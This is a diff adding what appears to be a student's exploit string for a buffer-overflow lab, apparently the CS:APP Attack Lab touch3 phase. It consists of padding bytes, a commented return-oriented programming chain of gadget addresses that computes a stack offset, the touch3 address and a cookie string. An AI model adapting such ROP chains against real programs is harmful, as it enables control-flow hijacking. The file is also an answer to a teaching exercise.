@@ -1,0 +1,68 @@
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+
+/* all values are 1 */
+d0 19 40 00 00 00 00 00   /* mov 1 to %eax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 2 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 4 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 8 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 16 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 32 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+/* all values are 64 */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+dd 19 40 00 00 00 00 00   /* mov %eax to %edx */
+34 1a 40 00 00 00 00 00   /* mov %edx to %ecx */
+27 1a 40 00 00 00 00 00   /* mov %ecx to %esi */
+
+
+06 1a 40 00 00 00 00 00   /* mov %rsp to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+d6 19 40 00 00 00 00 00   /* add %rdi, %rsi to %rax */
+c5 19 40 00 00 00 00 00   /* mov %rax to %rdi */
+cc 19 40 00 00 00 00 00   /* pop %rax */
+aa aa aa aa aa aa aa aa
+
+fa 18 40 00 00 00 00 00   /* the address of the touch3 function */
+
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+35 39 62 39 39 37 66 61   /* string value */
